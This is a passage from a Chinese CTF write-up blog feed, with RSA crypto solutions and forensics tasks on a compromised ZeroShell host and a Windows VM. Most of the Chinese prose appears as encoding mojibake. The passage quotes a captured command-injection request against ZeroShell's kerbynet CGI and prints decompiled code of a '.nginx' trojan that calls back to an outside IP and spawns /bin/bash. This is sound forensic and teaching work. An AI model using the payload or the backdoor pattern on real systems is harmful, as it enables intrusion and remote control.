style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.864108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1205469999999997em;vertical-align:-0.256439em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4435610000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.256439em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span></span></span></span></p><p>å¾—åˆ°514*p-114*qï¼Œç›´æ¥è·Ÿn=p*qè”ç«‹æ–¹ç¨‹å°±å¥½äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span>  *<br><br>n1=<span class="hljs-number">11253456301404072182754603079043141230357632788687128065946949158421386019810331746559589520167575285461013231695562260288474435323651486728462182455684783621146533735439516661083154202402094564409797610965484750133738948093654463980274589206533544745239593323687597158332853322688834333877527879648033739944377991072365645287974409264751053149810266318150358528958695995448206102977234465894707576713203411728480923368608079227663155141454053171021621895561229310948351858551966089589810458449489930569488309784787298671538269292547138600936732070803719330443830023896360524647242544758858550421544632830525000969021</span><br>c1=<span class="hljs-number">8499679502416909357939986454449383217929657276328884744252110300118585376760998970256899096933625143878216424502943862848223333991791355858607867618745163957692936089698174344113246726053590682306119213994882195821855969008568291868812781815357921466464892371352951440648343250861078226735739317822382957147244865046380055135366135267450129149663761447216572527854715442366920877558145509864933807963361779253891209769139019896894284962745494007050260900203902288375243100699726367780684955023612441356974739956402745147033094774686164403598983705486096400509860060256662636611892179313959468258085801623281908958306</span><br>hint11=<span class="hljs-number">17676209393363873836616956378006241932018678956800177404559670972320106080186175872019330254680063146159633352040419753333739877504801655707461743996360860074533886246883000834602444450563478802498391744461000891946602955271019377331422970647454283295639907116545974746002247519488100359581041415620977668314102564371271101341417292169569751</span><br>hint12=<span class="hljs-number">892164632137965257404704659317620180133919820054497710194577219436051826293520132465478378901898630232069660620200822495415347206456545002722997494118196531269124510503871707983543682617650707774098790755476191393584818990189315815327863744625319881016693821820062695832323709521864841849420105119520142732380645163928515949248627003405815102096473638849801662204513485212456415643028454337266359464009419892900199392235981999590510829354486285848071251803213507</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-number">0</span>:<br>    hint11=hint11+<span class="hljs-number">0x114</span><br>    hint12=hint12+<span class="hljs-number">0x514</span><br>    <span class="hljs-keyword">for</span> x1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">11</span>+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> x2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">11</span>+<span class="hljs-number">1</span>):<br>            q=<span class="hljs-built_in">int</span>(gcd(hint12*x1-hint11*x2,n1))<br>            <span class="hljs-keyword">if</span> q.bit_length()==<span class="hljs-number">1024</span> <span class="hljs-keyword">and</span> isPrime(q):<br>                flag1=long_to_bytes(<span class="hljs-built_in">pow</span>(c1,inverse(<span class="hljs-number">65537</span>,q-<span class="hljs-number">1</span>),q))<br>                <span class="hljs-built_in">print</span>(flag1)<br>                exit()<br><span class="hljs-comment">#b&#x27;flag&#123;5f97682d-e7bf-&#x27;           </span><br><br><span class="hljs-comment">#https://blog.csdn.net/luochen2436/article/details/129181271</span><br>n2=<span class="hljs-number">14217913464459559682250875501886201276876328130146621058904052452278231545562301222073675283834120195896879261204877956594249270008118834684665611333775785540398977821573478806703825815281652967784898299930527726439037749019760799845047679385220189738630913625419692052778253277286212296445004302620626988533627355677869101844377851844299099905220669618825288695316487157845779020847788016128286053705169807753579824931407426513605070820324686135268717340101082088189807681669714476855421572848587697256393664762171900144896459413927294243594831765921498135651902566596193419698276450417081358963095530327916716815471</span><br>c2=<span class="hljs-number">10813198470406533857220297365144817764494546388124020326246100807725599407936858418372461604440989526434764769646474529144698553404454498330299339001268266442190881046798013800230695418512588589548559815286659383606192081671939800961491163261471780789234548933509984782326050156749252109417469372350353839078435276939895993315409326959545136004479234394204733463770802144577959343353853931551396004269664808998993218026499223645426011418112367165355608052943350106781733459127034314624179963889512767512695687925177031381133173284545775059709716565412326201630506864491038183759653328168822467109694920688415836066824</span><br>s=<span class="hljs-number">8622138450599474319575025668181890197317138615118712483697608983729406165889177728238980145474189791200674222799428164855362343438877601351502481230300737810189886212903644248984679582387466437485042409474427772423432264350891006157655032700171141741601071796907799334832768249378115672861466623851728568869966008957739548946015354053401528336142451508118071266077071413659041952533227860880436238236471883889518976004280218746662796058207527002850084337608848782124623974707511360966275169272055067156929736605139147390769499862668667648054224585342241937444069239228396295614125346897679304557597611584898082698898</span><br>m1 = gmpy2.invert(s,n2)<br>p,q = symbols(<span class="hljs-string">&#x27;p q&#x27;</span>)<br>eq = [p*q-n2,<span class="hljs-number">514</span>*p - <span class="hljs-number">114</span>*q-m1]<br>result = nonlinsolve(eq,[p,q])<br>result = <span class="hljs-built_in">list</span>(result)<br>p,q = <span class="hljs-built_in">int</span>(result[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]),<span class="hljs-built_in">int</span>(result[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>])<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(<span class="hljs-number">65537</span>,phi)<br>flag2 = <span class="hljs-built_in">pow</span>(c2,d,n2)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(flag2))<br><span class="hljs-comment">#b&#x27;43ea-ac35-0a842bc974c1&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="å¨èƒæµé‡"><a class="markdownIt-Anchor" href="#å¨èƒæµé‡"></a> å¨èƒæµé‡</h3><h4 id="zeroshell"><a class="markdownIt-Anchor" href="#zeroshell"></a> zeroshell</h4><h5 id="zeroshell-1"><a class="markdownIt-Anchor" href="#zeroshell-1"></a> zeroshell-1</h5><p>åäº† ç¿»äº†ä¸€å¤§åœˆï¼Œç»“æœå‘ç°åœ¨Refereré‡Œï¼Œå› ä¸ºåˆ«çš„åœ°æ–¹çœŸçš„æ²¡ä¸œè¥¿äº†</p><p>GET /cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=â€˜%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20â€“checkpoint=1%20â€“checkpoint-action=exec=â€˜ps%20-efâ€™%0Aâ€™ HTTP/1.1 Host: 61.139.2.100 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept-Encoding: gzip, deflate Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8 Connection: close Accept-Language: en-US,en;q=0.5 Referer: ZmxhZ3s2QzJFMzhEQS1EOEU0LThEODQtNEE0Ri1FMkFCRDA3QTFGM0F9 Upgrade-Insecure-Requests: 1</p><p>flag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A}</p><h5 id="zeroshell-2"><a class="markdownIt-Anchor" href="#zeroshell-2"></a> zeroshell-2</h5><p>ç›´æ¥æŒ‚è½½ç¡¬ç›˜ï¼Œæ–‡ä»¶ä½äº/dev/sdb4ä¸­ï¼Œå³ç¬¬å››é€»è¾‘åˆ†åŒº</p><p>root@debianTemplate12:/mnt/sdb/sdb4/_DB.001# cat flag</p><p>c6045425-6e6e-41d0-be09-95682a4f65c4</p><p>å³å¯å¾—åˆ°</p><h5 id="zeroshell-3"><a class="markdownIt-Anchor" href="#zeroshell-3"></a> zeroshell-3</h5><p>é€šè¿‡WiresharkæŠ“åŒ…å‘ç°ï¼Œæ€»æ˜¯åœ¨è¿æ¥è¿™ä¸ªipåœ°å€</p><p>Internet Protocol Version 4, Src: 61.139.2.100, Dst: 202.115.89.103</p><h5 id="zeroshell-4"><a class="markdownIt-Anchor" href="#zeroshell-4"></a> zeroshell-4</h5><p>netstat -anp |grep 103 å¤šæ¬¡å°è¯•å‘ç°æœ‰æ—¶å€™ä¼šæœ‰ä¸€ä¸ª bash</p><p><img src="/imgs/CISCNCCB2025/zeroshell/1.png" alt="" /></p><p>ps -auxå‘ç°æ—¶ä¸æ—¶æœ‰ä¸ª</p><p>/bin/bash 1120 32</p><p>ps -feww å‘ç°å®ƒppidæ˜¯1</p><p>PPID 1</p><p>ps -ppid 1 å‘ç°è¿™ä¸ª.nginxä¼šå‘¨æœŸæ‰§è¡Œï¼Œå¹¶ä¸”æ‰§è¡Œå¾ˆå¤šåï¼Œè¿æ¥æœ¨é©¬é¢‘ç‡æ˜æ˜¾å˜å¿«</p><p><img src="/imgs/CISCNCCB2025/zeroshell/2.png" alt="" /></p><p>æœ€ç»ˆå¾—åˆ°çš„æœ¨é©¬æ–‡ä»¶</p><p>flag{.nginx}</p><h5 id="zeroshell-5"><a class="markdownIt-Anchor" href="#zeroshell-5"></a> zeroshell-5</h5><p>çœ‹stringçª—å£ï¼Œæ‰¾åˆ°ä¸€ä¸ªæ¯”è¾ƒåƒå¯†é’¥çš„å­—ç¬¦ä¸²</p><p><img src="/imgs/CISCNCCB2025/zeroshell/3.png" alt="" /></p><p>å®šä½å­—ç¬¦ä¸²ï¼Œå‘ç°è¿™ä¸ªå‡½æ•°é‡Œæœ‰/bin/bash  , ä»¥åŠé€šä¿¡åœ°å€ï¼Œé‚£ä¹ˆ11223344qweasdzxcå¤§æ¦‚ç‡å°±æ˜¯åŠ å¯†å¯†é’¥äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span> *)*a2, <span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>  v2 = sub_8063EB0();<br>  <span class="hljs-keyword">if</span> ( v2 &lt; <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( !v2 )<br>  &#123;<br>    v4 = sub_8064310(<span class="hljs-number">0</span>);<br>    v3 = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> ( v4 &gt;= <span class="hljs-number">0</span> )<br>    &#123;<br>      <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i != <span class="hljs-number">1024</span>; ++i )<br>        sub_80645D0(i);<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>      &#123;<br>        <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>        &#123;<br>          <span class="hljs-keyword">do</span><br>          &#123;<br>            <span class="hljs-keyword">do</span><br>            &#123;<br>              sub_8063C10(<span class="hljs-number">30</span>);<br>              v6 = sub_80682F0(<span class="hljs-number">2</span>);<br>            &#125;<br>            <span class="hljs-keyword">while</span> ( v6 &lt; <span class="hljs-number">0</span> );<br>            v7 = sub_8068AD0(<span class="hljs-string">&quot;202.115.89.103&quot;</span>);<br>          &#125;<br>          <span class="hljs-keyword">while</span> ( !v7 );<br>          sub_8057DE0(&amp;v12, **(_DWORD **)(v7 + <span class="hljs-number">16</span>), *(_DWORD *)(v7 + <span class="hljs-number">12</span>));<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)sub_8068170(v6) &gt;= <span class="hljs-number">0</span> )<br>          &#123;<br>            v8 = sub_8063EB0();<br>            <span class="hljs-keyword">if</span> ( v8 &gt;= <span class="hljs-number">0</span> )<br>              <span class="hljs-keyword">break</span>;<br>          &#125;<br>          sub_80645D0(v6);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ( !v8 )<br>          <span class="hljs-keyword">break</span>;<br>        sub_8063B80(v8, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        sub_80645D0(v6);<br>      &#125;<br>      v9 = sub_8063EB0();<br>      v3 = <span class="hljs-number">8</span>;<br>      <span class="hljs-keyword">if</span> ( v9 &gt;= <span class="hljs-number">0</span> )<br>      &#123;<br>        LOBYTE(v3) = <span class="hljs-number">9</span>;<br>        <span class="hljs-keyword">if</span> ( !v9 )<br>        &#123;<br>          sub_8063BF0(<span class="hljs-number">3</span>);<br>          <span class="hljs-keyword">if</span> ( sub_8049C93(v6, (<span class="hljs-type">int</span>)::a2) == <span class="hljs-number">1</span> )<br>            <span class="hljs-comment">// 11223344qweasdzxc</span><br></code></pre></td></tr></table></figure><h5 id="zeroshell-6"><a class="markdownIt-Anchor" href="#zeroshell-6"></a> zeroshell-6</h5><p><img src="/imgs/CISCNCCB2025/zeroshell/4.png" alt="" /></p><p>æŠŠ.nginxæ–‡ä»¶æ¢æˆcatï¼Œå¡åœ¨äº†åŠ è½½è„šæœ¬ï¼Œè¯´æ˜æ–‡ä»¶ä¸€ä¸ªå°±æ˜¯åœ¨è¿™äº›è„šæœ¬é‡Œ</p><p><img src="/imgs/CISCNCCB2025/zeroshell/5.png" alt="" /></p><p><img src="/imgs/CISCNCCB2025/zeroshell/6.png" alt="" /></p><p>è¿™è¯´æ˜ç¡®å®åœ¨è¿™</p><p>é‚£æˆ‘ä»¬æ‰¾ä¸€ä¸‹è¿™ä¸ªè„šæœ¬æ”¾å“ªçš„</p><p><img src="/imgs/CISCNCCB2025/zeroshell/7.png" alt="" /></p><p>æ‹¿findæœç´¢nat æœ€åçœ‹åˆ°/var/register/system/startup/scripts/nat/File</p><h4 id="winft"><a class="markdownIt-Anchor" href="#winft"></a> WinFT</h4><h5 id="winft-1"><a class="markdownIt-Anchor" href="#winft-1"></a> WinFT-1</h5><p>è™šæ‹Ÿæœºé‡Œé¢è‡ªå¸¦çš„ç«ç»’å‰‘åˆ†æç½‘ç»œï¼Œå‘ç°å¯ç–‘ç¨‹åºå’Œip</p><p><img src="/imgs/CISCNCCB2025/WinFT/1.png" alt="" /></p><p>ä½¿ç”¨wiresharkè¿‡æ»¤ipï¼Œç¿»åˆ°æœ€åæœ‰ä¸€ä¸ªhttpåŒ…ï¼Œé‡Œé¢æœ‰åŸŸå</p><p><img src="/imgs/CISCNCCB2025/WinFT/2.png" alt="" /></p><h5 id="winft-2"><a class="markdownIt-Anchor" href="#winft-2"></a> WinFT-2</h5><p>æ‰“å¼€è®¡åˆ’ä»»åŠ¡</p><p><img src="/imgs/CISCNCCB2025/WinFT/3.png" alt="" /></p><p>JiM3ODsmIzEwNTsmIzk5OyYjMTAxOyYjNjUyOTI7JiMxMDI7JiMxMDg7JiM5NzsmIzEwMzsmIzMyOyYjMTA1OyYjMTE1OyYjMzI7JiMxMjM7JiM2NTsmIzY5OyYjODM7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzk1OyYjMTA1OyYjMTE1OyYjOTU7JiM5NzsmIzExMDsmIzk1OyYjMTAxOyYjMTIwOyYjOTk7JiMxMDE7JiMxMDg7JiMxMDg7JiMxMDE7JiMxMTA7JiMxMTY7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzEyNTs=</p><p>78 105 99 101 65292 102 108 97 103 32 105 115 32 123 65 69 83 95 101 110 99 114 121 112 116 105 111 110 95 97 108 103 111 114 105 116 104 109 95 105 115 95 97 110 95 101 120 99 101 108 108 101 110 116 95 101 110 99 114 121 112 116 105 111 110 95 97 108 103 111 114 105 116 104 109 125</p><p>åˆ é™¤65292ï¼Œåè¿›åˆ¶è½¬asciiç å°±è¡Œäº†</p><p>{AES_encryption_algorithm_is_an_excellent_encryption_algorithm}</p><h4 id="sc05"><a class="markdownIt-Anchor" href="#sc05"></a> sc05</h4><h5 id="sc05-1"><a class="markdownIt-Anchor" href="#sc05-1"></a> sc05-1</h5><p>åˆ‡æ¢åˆ°TCPçš„è¡¨æœç´¢134.6.4.12</p><p>æ‰¾åˆ°æœ€è¿‘æ—¶é—´2024/11/09_16:22:42</p><p>01DF5BC2388E287D4CC8F11EA4D31929</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>Forensics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å›½åŸæ¯2024-Crypto</title>
    <link href="/2024/12/07/GCB2024/"/>
    <url>/2024/12/07/GCB2024/</url>
    
    <content type="html"><![CDATA[<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> crypto</h1><h2 id="babyrsa"><a class="markdownIt-Anchor" href="#babyrsa"></a> babyRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span>*<br><br>flag = <span class="hljs-string">b&#x27;D0g3xGC&#123;****************&#125;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_key</span>(<span class="hljs-params">p, q</span>):<br>    public_key = p*p*q<br>    e = public_key<br>    n = p*q<br>    phi_n = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>    private_key = inverse(e,phi_n)<br>    <span class="hljs-keyword">return</span> public_key,private_key,e<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br><br>N,d,e = gen_key(p,q)<br><br>c = gmpy2.powmod(bytes_to_long(flag),e,N)<br><br><span class="hljs-built_in">print</span>(N)<br><span class="hljs-built_in">print</span>(d)<br><span class="hljs-built_in">print</span>(c)<br></code></pre></td></tr></table></figure><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/MikeCoke/article/details/113915715">blog.csdn.net/MikeCoke/article/details/113915715</a></p></blockquote><p><em>Schmidt-Samoa</em>å¯†ç :<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><msup><mi>p</mi><mn>2</mn></msup><mo>âˆ—</mo><mi>q</mi><mo separator="true">,</mo><mi>e</mi><mo>=</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">N=p^2*q,e=N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span></p><p>è§£å¯†ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>m</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mo>âˆ—</mo><mi>q</mi><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">m=c^d\mod p*q\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span></span></span></span></p><p>è·å–p*qï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>e</mi><mo>âˆ—</mo><mi>d</mi><mo>=</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo>âˆ—</mo><mo stretchy="false">(</mo><mi>q</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>N</mi><mo>âˆ—</mo><mi>d</mi><mo>=</mo><mn>1</mn><mo>+</mo><mi>k</mi><mo>âˆ—</mo><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo>âˆ—</mo><mo stretchy="false">(</mo><mi>q</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>ç”±æ¬§æ‹‰å®šç†å¾—ï¼š</mtext><msup><mn>2</mn><mrow><mi>N</mi><mo>âˆ—</mo><mi>d</mi></mrow></msup><mo>â‰¡</mo><msup><mn>2</mn><mrow><mn>1</mn><mo>+</mo><mi>k</mi><mo>âˆ—</mo><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo>âˆ—</mo><mo stretchy="false">(</mo><mi>q</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo>â‰¡</mo><mo>=</mo><mn>2</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mo>âˆ—</mo><mi>q</mi><mo>=</mo><mn>2</mn><mo>+</mo><mi>k</mi><mo>âˆ—</mo><mi>p</mi><mi>q</mi><mspace linebreak="newline"></mspace><mtext>ä¸</mtext><mi>N</mi><mtext>æ±‚</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mtext>å³å¯å¾—åˆ°</mtext><mi>p</mi><mo>âˆ—</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">e*d=1\mod 